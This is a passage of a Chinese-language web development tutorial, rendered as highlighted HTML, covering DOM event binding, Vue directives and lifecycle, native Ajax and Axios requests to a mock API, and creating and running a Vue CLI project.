class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.4 获取元素-根据class属性获取</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var divs = document.getElementsByClassName(&#x27;cls&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// for (let i = 0; i &lt; divs.length; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     alert(divs[i]);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//2. 查询参考手册, 属性、方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> divs = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;cls&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> div1 = divs[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    div1.<span class="property">innerHTML</span> = <span class="string">&quot;传智教育666&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-事件绑定"><a href="#7-事件绑定" class="headerlink" title="7).事件绑定"></a>7).事件绑定</h3><h4 id="方式1：通过html标签中的事件属性进行绑定"><a href="#方式1：通过html标签中的事件属性进行绑定" class="headerlink" title="方式1：通过html标签中的事件属性进行绑定"></a>方式1：通过html标签中的事件属性进行绑定</h4><p>例如一个按钮，我们对于按钮可以绑定单机事件，可以借助标签的onclick属性，属性值指向一个函数。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;事件绑定1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;on()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>很明显没有on函数，所以我们需要创建该函数，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">on</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;按钮1被点击了...&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方式2：通过DOM中Element元素的事件属性进行绑定"><a href="#方式2：通过DOM中Element元素的事件属性进行绑定" class="headerlink" title="方式2：通过DOM中Element元素的事件属性进行绑定"></a>方式2：通过DOM中Element元素的事件属性进行绑定</h4><p>依据我们学习过得DOM的知识点，我们知道html中的标签被加载成element对象，所以我们也可以通过element对象的属性来操作标签的属性。此时我们再次添加一个按钮，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;事件绑定2&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以先通过id属性获取按钮对象，然后操作对象的onclick属性来绑定事件，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn2&#x27;</span>).<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;按钮2被点击了...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-一些常见的事件"><a href="#8-一些常见的事件" class="headerlink" title="8).一些常见的事件"></a>8).一些常见的事件</h3><table>
<thead>
<tr>
<th>事件属性名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>onclick</td>
<td>鼠标单击事件</td>
</tr>
<tr>
<td>onblur</td>
<td>元素失去焦点</td>
</tr>
<tr>
<td>onfocus</td>
<td>元素获得焦点</td>
</tr>
<tr>
<td>onload</td>
<td>某个页面或图像被完成加载</td>
</tr>
<tr>
<td>onsubmit</td>
<td>当表单提交时触发该事件</td>
</tr>
<tr>
<td>onmouseover</td>
<td>鼠标被移到某元素之上</td>
</tr>
<tr>
<td>onmouseout</td>
<td>鼠标从某元素移开</td>
</tr>
</tbody></table>
<h2 id="4、vue的基本使用"><a href="#4、vue的基本使用" class="headerlink" title="4、vue的基本使用"></a>4、vue的基本使用</h2><h3 id="1、快速入门"><a href="#1、快速入门" class="headerlink" title="1、快速入门"></a>1、快速入门</h3><p>第一步：将vue.js下载拷贝到项目目录下</p>
<p>第二步：然后编写&lt;script&gt;标签来引入vue.js文件，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第三步：在js代码区域定义vue对象,代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//定义Vue对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>, <span class="comment">//vue接管区域</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&quot;Hello Vue&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在创建vue对象时，有几个常用的属性：</p>
<ul>
<li>el:  用来指定哪儿些标签受 Vue 管理。 该属性取值 <code>#app</code> 中的 <code>app</code> 需要是受管理的标签的id属性值</li>
<li>data: 用来定义数据模型</li>
<li>methods: 用来定义函数。这个我们在后面就会用到</li>
</ul>
<p>第四步：在html区域编写视图，其中双大括号是插值表达式，用来将vue对象中定义的model展示到页面上的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line">        &#123;&#123;message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>浏览器打开效果如图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/9485d513933405e6a210b4d9c55c3643--bbba--image-20231121195000984.png" alt="image-20231121195000984"></p>
<h3 id="2、vue指令"><a href="#2、vue指令" class="headerlink" title="2、vue指令"></a>2、vue指令</h3><table>
<thead>
<tr>
<th><strong>指令</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><u><strong>v-bind</strong></u></td>
<td><u><strong>为HTML标签绑定属性值，如设置  href , css样式等</strong></u></td>
</tr>
<tr>
<td><u><strong>v-model</strong></u></td>
<td><u><strong>在表单元素上创建双向数据绑定</strong></u></td>
</tr>
<tr>
<td>v-on</td>
<td>为HTML标签绑定事件</td>
</tr>
<tr>
<td>v-if</td>
<td>条件性的渲染某元素，判定为true时渲染,否则不渲染</td>
</tr>
<tr>
<td>v-else</td>
<td></td>
</tr>
<tr>
<td>v-else-if</td>
<td></td>
</tr>
<tr>
<td>v-show</td>
<td>根据条件展示某元素，区别在于切换的是display属性的值</td>
</tr>
<tr>
<td>v-for</td>
<td>列表渲染，遍历容器的元素或者对象的属性</td>
</tr>
</tbody></table>
<h4 id="①v-bind"><a href="#①v-bind" class="headerlink" title="①v-bind:"></a>①v-bind:</h4><p>为HTML标签绑定属性值，如设置  href , css样式等。当vue对象中的数据模型发生变化时，标签的属性值会随之发生变化。</p>
<h4 id="②v-model："><a href="#②v-model：" class="headerlink" title="②v-model："></a>②v-model：</h4><p>在表单元素上创建双向数据绑定。什么是双向？</p>
<ul>
<li>vue对象的data属性中的数据变化，视图展示会一起变化</li>
<li>视图数据发生变化，vue对象的data属性中的数据也会随着变化。</li>
</ul>
<p>data属性中数据变化，我们知道可以通过赋值来改变，但是视图数据为什么会发生变化呢？<strong>只有表单项标签！所以双向绑定一定是使用在表单项标签上的</strong>。</p>
<p>接下来我们学习一下v-on指令。</p>
<h4 id="③v-on"><a href="#③v-on" class="headerlink" title="③v-on:"></a>③v-on:</h4><p>用来给html标签绑定事件的。<strong>需要注意的是如下2点</strong>：</p>
<ul>
<li><p>v-on语法给标签的事件绑定的函数，必须是vue对象种声明的函数</p>
</li>
<li><p>v-on语法绑定事件时，事件名相比较js中的事件名，没有on</p>
<p>例如：在js中，事件绑定demo函数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">&quot;demo()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>vue中，事件绑定demo函数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-on:click</span>=<span class="string">&quot;demo()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="④v-if和v-show"><a href="#④v-if和v-show" class="headerlink" title="④v-if和v-show"></a>④v-if和v-show</h4><p>用于觉得是否展示</p>
<p>可以发现，浏览器呈现的效果是一样的，但是浏览器中html源码不一样。v-if指令，不满足条件的标签代码直接没了，而v-show指令中，不满足条件的代码依然存在，只是添加了css样式来控制标签不去显示。</p>
<h4 id="⑤v-for"><a href="#⑤v-for" class="headerlink" title="⑤v-for"></a>⑤v-for</h4><p>v-for: 从名字我们就能看出，这个指令是用来遍历的。其语法格式如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">标签</span> <span class="attr">v-for</span>=<span class="string">&quot;变量名 in 集合模型数据&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;变量名&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">标签</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是：需要循环那个标签，v-for 指令就写在那个标签上。</p>
<p>有时我们遍历时需要使用索引，那么v-for指令遍历的语法格式如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">标签</span> <span class="attr">v-for</span>=<span class="string">&quot;(变量名,索引变量) in 集合模型数据&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--索引变量是从0开始，所以要表示序号的话，需要手动的加1--&gt;</span></span><br><span class="line">   &#123;&#123;索引变量 + 1&#125;&#125; &#123;&#123;变量名&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">标签</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3、生命周期"><a href="#3、生命周期" class="headerlink" title="3、生命周期"></a>3、生命周期</h3><p>vue的生命周期：指的是vue对象从创建到销毁的过程。vue的生命周期包含8个阶段：每触发一个生命周期事件，会自动执行一个生命周期方法，这些生命周期方法也被称为钩子方法。其完整的生命周期如下图所示：</p>
<table>
<thead>
<tr>
<th>状态</th>
<th>阶段周期</th>
</tr>
</thead>
<tbody><tr>
<td>beforeCreate</td>
<td>创建前</td>
</tr>
<tr>
<td>created</td>
<td>创建后</td>
</tr>
<tr>
<td>beforeMount</td>
<td>挂载前</td>
</tr>
<tr>
<td>mounted</td>
<td>挂载完成</td>
</tr>
<tr>
<td>beforeUpdate</td>
<td>更新前</td>
</tr>
<tr>
<td>updated</td>
<td>更新后</td>
</tr>
<tr>
<td>beforeDestroy</td>
<td>销毁前</td>
</tr>
<tr>
<td>destroyed</td>
<td>销毁后</td>
</tr>
</tbody></table>
<p>下图是 Vue 官网提供的从创建 Vue 到效果 Vue 对象的整个过程及各个阶段对应的钩子函数：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/d3dd27cb2a5d10c6de0c00f4c9cf12fd--9b10--image-20231121195747907.png" alt="image-20231121195747907"></p>
<p>其中我们需要重点关注的是**mounted,**其他的我们了解即可。</p>
<p>mounted：挂载完成，Vue初始化成功，HTML页面渲染成功。<strong>以后我们一般用于页面初始化自动的ajax请求后台数据</strong></p>
<h2 id="5、Ajax的使用"><a href="#5、Ajax的使用" class="headerlink" title="5、Ajax的使用"></a>5、Ajax的使用</h2><h3 id="1、Ajax的介绍"><a href="#1、Ajax的介绍" class="headerlink" title="1、Ajax的介绍"></a>1、Ajax的介绍</h3><p>我们详细的解释一下Ajax技术的2个作用</p>
<ul>
<li><p>与服务器进行数据交互</p>
<p>如下图所示前端资源被浏览器解析，但是前端页面上缺少数据，前端可以通过Ajax技术，向后台服务器发起请求，后台服务器接受到前端的请求，从数据库中获取前端需要的资源，然后响应给前端，前端在通过我们学习的vue技术，可以将数据展示到页面上，这样用户就能看到完整的页面了。此处可以对比JavaSE中的网络编程技术来理解。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/1478bd2c5b10db3902848da91ea311f7--5dc6--image-20231125221238816.png" alt="image-20231125221238816"></p>
<p>异步交互：可以在<strong>不重新加载整个页面</strong>的情况下，与服务器交换数据并<strong>更新部分网页</strong>的技术。</p>
<p>如下图所示，当我们再百度搜索java时，下面的联想数据是通过Ajax请求从后台服务器得到的，在整个过程中，我们的Ajax请求不会导致整个百度页面的重新加载，并且只针对搜索栏这局部模块的数据进行了数据的更新，不会对整个页面的其他地方进行数据的更新，这样就大大提升了页面的加载速度，用户体验高。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/9c8182429cd46012b107552c0eaa8f90--794e--image-20231125221257133.png" alt="image-20231125221257133"></p>
<p>这里也就再来讲下异步操作和同步操作的区别是什么。</p>
<p>同步请求发送过程如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/3eee530c76cba726b219ea41081ef642--233d--image-20231125221354077.png" alt="image-20231125221354077"></p>
<ul>
<li><p>浏览器页面在发送请求给服务器，在服务器处理请求的过程中，浏览器页面不能做其他的操作。只能等到服务器响应结束后才能，浏览器页面才能继续做其他的操作。 </p>
</li>
<li><p>异步请求发送过程如下图所示：</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/c577c087270747d00d18b684c2ebcca0--5447--image-20231125221404817.png" alt="image-20231125221404817"></p>
<ul>
<li>浏览器页面发送请求给服务器，在服务器处理请求的过程中，浏览器页面还可以做其他的操作。</li>
</ul>
<p>这样就能像百度搜索那样，未点击搜索但是仍然可以显示部分数据。</p>
<h3 id="2、Ajax的简单使用"><a href="#2、Ajax的简单使用" class="headerlink" title="2、Ajax的简单使用"></a>2、Ajax的简单使用</h3><ul>
<li><p>服务器端</p>
<p>因为我们暂时还没学过服务器端的代码，所以此处已经直接提供好了服务器端的请求地址，我们前端直接通过Ajax请求访问该地址即可。<strong>后台服务器地址</strong>：<a href="http://yapi.smart-xwork.cn/mock/169327/emp/list">http://yapi.smart-xwork.cn/mock/169327/emp/list</a></p>
<p>上述地址我们也可以直接通过浏览器来访问，访问结果如图所示：只截取部分数据</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/e3c78a9e3285d3b9c77530b3800ca1d1--4d72--image-20231125222034015.png" alt="image-20231125222034015"></p>
</li>
<li><p>客户端</p>
<p>客户端的Ajax请求代码如下有如下4步，接下来我们跟着步骤一起操作一下。</p>
<p>第一步：首先我们再VS Code中创建AJAX的文件夹，并且创建名为01. Ajax-原生方式.html的文件，提供如下代码，主要是按钮绑定单击事件，我们希望点击按钮，来发送ajax请求</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>原生Ajax<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;获取数据&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;getData()&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">     </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二步：创建XMLHttpRequest对象，用于和服务器交换数据，也是原生Ajax请求的核心对象，提供了各种方法。代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1. 创建XMLHttpRequest </span></span><br><span class="line"><span class="keyword">var</span> xmlHttpRequest  = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br></pre></td></tr></table></figure>

<p>第三步：调用对象的open()方法设置请求的参数信息，例如请求地址，请求方式。然后调用send()方法向服务器发送请求，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//2. 发送异步请求</span></span><br><span class="line">xmlHttpRequest.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;http://yapi.smart-xwork.cn/mock/169327/emp/list&#x27;</span>);</span><br><span class="line">xmlHttpRequest.<span class="title function_">send</span>();<span class="comment">//发送请求</span></span><br></pre></td></tr></table></figure>

<p>第四步：我们通过绑定事件的方式，来获取服务器响应的数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//3. 获取服务响应数据</span></span><br><span class="line">xmlHttpRequest.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//此处判断 4表示浏览器已经完全接受到Ajax请求得到的响应， 200表示这是一个正确的Http请求，没有错误</span></span><br><span class="line">    <span class="keyword">if</span>(xmlHttpRequest.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xmlHttpRequest.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>).<span class="property">innerHTML</span> = xmlHttpRequest.<span class="property">responseText</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>最后我们通过浏览器打开页面，请求点击按钮，发送Ajax请求，最终显示结果如下图所示：</p>
<p> <img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/199862e599fc5422f4a52ec17821161c--1f36--image-20231125222026868.png" alt="image-20231125222026868"></p>
<p>并且通过浏览器的f12抓包，我们点击网络中的XHR请求，发现可以抓包到我们发送的Ajax请求。XHR代表的就是异步请求</p>
</li>
</ul>
<p>这些代码看起来也就是很复杂吧，很不方便去记忆，这个时候，Axios就因此诞生了。</p>
<h3 id="3、Axios"><a href="#3、Axios" class="headerlink" title="3、Axios"></a>3、Axios</h3><p>Axios的使用比较简单，主要分为2步：</p>
<ul>
<li><p>引入Axios文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/axios-0.18.0.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用Axios发送请求，并获取响应结果，官方提供的api很多，此处给出2种，如下</p>
<ul>
<li><p>发送 get 请求</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&quot;get&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;http://localhost:8080/ajax-demo1/aJAXDemo1?username=zhangsan&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(resp.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>发送 post 请求</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;http://localhost:8080/ajax-demo1/aJAXDemo1&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>:<span class="string">&quot;username=zhangsan&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(resp.<span class="property">data</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>axios()是用来发送异步请求的，小括号中使用 js的JSON对象传递请求相关的参数：</p>
<ul>
<li>method属性：用来设置请求方式的。取值为 get 或者 post。</li>
<li>url属性：用来书写请求的资源路径。如果是 get 请求，需要将请求参数拼接到路径的后面，格式为： url?参数名&#x3D;参数值&amp;参数名2&#x3D;参数值2。</li>
<li>data属性：作为请求体被发送的数据。也就是说如果是 post 请求的话，数据需要作为 data 属性的值。</li>
</ul>
<p>then() 需要传递一个匿名函数。我们将 then()中传递的匿名函数称为 <strong>回调函数</strong>，意思是该匿名函数在发送请求时不会被调用，而是在成功响应后调用的函数。而该回调函数中的 resp 参数是对响应的数据进行封装的对象，通过 resp.data 可以获取到响应的数据。</p>
</li>
</ul>
<p>Axios还针对不同的请求，提供了别名方式的api,具体如下：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>axios.get(url [, config])</td>
<td>发送get请求</td>
</tr>
<tr>
<td>axios.delete(url [, config])</td>
<td>发送delete请求</td>
</tr>
<tr>
<td>axios.post(url [, data[, config]])</td>
<td>发送post请求</td>
</tr>
<tr>
<td>axios.put(url [, data[, config]])</td>
<td>发送put请求</td>
</tr>
</tbody></table>
<p>我们目前只关注get和post请求，所以在上述的入门案例中，我们可以将get请求代码改写成如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">axios.<span class="title function_">get</span>(<span class="string">&quot;http://yapi.smart-xwork.cn/mock/169327/emp/list&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>post请求改写成如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">axios.<span class="title function_">post</span>(<span class="string">&quot;http://yapi.smart-xwork.cn/mock/169327/emp/deleteById&quot;</span>,<span class="string">&quot;id=1&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="6、Vue的简单教程介绍"><a href="#6、Vue的简单教程介绍" class="headerlink" title="6、Vue的简单教程介绍"></a>6、Vue的简单教程介绍</h2><h3 id="1、项目创建"><a href="#1、项目创建" class="headerlink" title="1、项目创建"></a>1、项目创建</h3><p>环境准备好了，接下来我们需要通过Vue-cli创建一个vue项目，然后再学习一下vue项目的目录结构。Vue-cli提供了如下2种方式创建vue项目:</p>
<ul>
<li><p>命令行：直接通过命令行方式创建vue项目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vue create vue-project01</span><br></pre></td></tr></table></figure>


</li>
<li><p>图形化界面：通过命令先进入到图形化界面，然后再进行vue工程的创建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vue ui</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2、项目结构的简单分析"><a href="#2、项目结构的简单分析" class="headerlink" title="2、项目结构的简单分析"></a>2、项目结构的简单分析</h3><p>我们通过VS Code打开之前创建的vue文件夹，打开之后，呈现如下图所示页面：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/a84df0d25fc9623cd84a8136751af782--7c96--image-20231125224706489.png" alt="image-20231125224706489"></p>
<p>vue项目的标准目录结构以及目录对应的解释如下图所示:</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/5cc1aec4f35e31988a0864b2586a0c5e--5409--image-20231125224714378.png" alt="image-20231125224714378"></p>
<p>其中我们平时开发代码就是在<strong>src目录</strong>下	</p>
<h3 id="3、Vue项目的运行"><a href="#3、Vue项目的运行" class="headerlink" title="3、Vue项目的运行"></a>3、Vue项目的运行</h3><p>那么vue项目开发好了，我们应该怎么运行vue项目呢？主要提供了2种方式</p>
<ul>
<li>第一种方式：通过VS Code提供的图形化界面 ，如下图所示：（注意：NPM脚本窗口默认不显示，可以参考本节的最后调试出来）</li>
</ul>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/c06bda53d80150fc54aea584a377c7d0--c078--image-20231125225846123.png" alt="image-20231125225846123"></p>
<p>点击之后，我们等待片刻，即可运行，在终端界面中，我们发现项目是运行在本地服务的8080端口，我们直接通过浏览器打开地址</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/f1f262284f1a4dd41228e35f1ecf52e8--3933--image-20231125225858533.png" alt="image-20231125225858533"></p>
<p>最终浏览器打开后，呈现如下界面，表示项目运行成功</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/c7ec1f87086087633a3fc5e245fdc31a--d81e--image-20231125225912576.png" alt="image-20231125225912576"></p>
<p>其实此时访问的是 <strong>src&#x2F;App.vue</strong>这个根组件，此时我们打开这个组件，修改代码：添加内容Vue</p>
<p>只要我们保存更新的代码，我们直接打开浏览器，不需要做任何刷新，发现页面呈现内容发生了变化，如下图所示：</p>
<p>这就是我们vue项目的热更新功能 </p>
<p>对于8080端口，经常被占用，所以我们可以去修改默认的8080端口。我们修改vue.config.js文件的内容，添加如下代码：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">devServer<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    port<span class="punctuation">:</span><span class="number">7000</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>第二种方式：命令行方式</p>
<p>直接基于cmd命令窗口，在vue目录下，执行输入命令<code>npm run serve</code>即可，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/65f26040c8e0cf8668a0e615a8a223ea--ef9c--image-20231125230802565.png" alt="image-20231125230802565"></p>
